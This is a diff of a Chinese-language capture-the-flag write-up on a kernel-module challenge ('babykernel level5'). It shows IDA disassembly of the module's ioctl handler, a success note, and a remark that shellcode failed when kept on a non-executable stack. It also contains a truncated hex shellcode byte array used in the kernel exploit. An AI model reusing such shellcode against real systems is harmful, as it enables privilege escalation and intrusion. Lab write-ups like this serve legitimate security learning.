@@ -2,8 +2,6 @@
 
 babykernel 补完
 
-
-
 ## babykernel_level5_teaching1.ko
 
 ![image-20210224204729323](https://gitee.com/scriptkiddies/images/raw/master/image-20210224204729323.png)
@@ -80,8 +78,6 @@ __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 a
 .text.unlikely:0000000000000FC6                 retn
 .text.unlikely:0000000000000FC6 device_ioctl    endp
 ```
-
-
 
 思路：
 
@@ -184,8 +180,6 @@ pwn！
 
 ![image-20210225010000177](https://gitee.com/scriptkiddies/images/raw/master/image-20210225010000177.png)
 
-
-
 其实这个题目有个坑
 
 就是如果你的 `shellcode` 放的那块内存是不可执行的话就会失败，之前我的 `payload` 是放在一个字符数组里面，数组是放在栈上的
@@ -203,4 +197,3 @@ char shellcode[] = {"\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xf
 $ date
 Thu 25 Feb 2021 01:12:21 AM CST
 ```
-
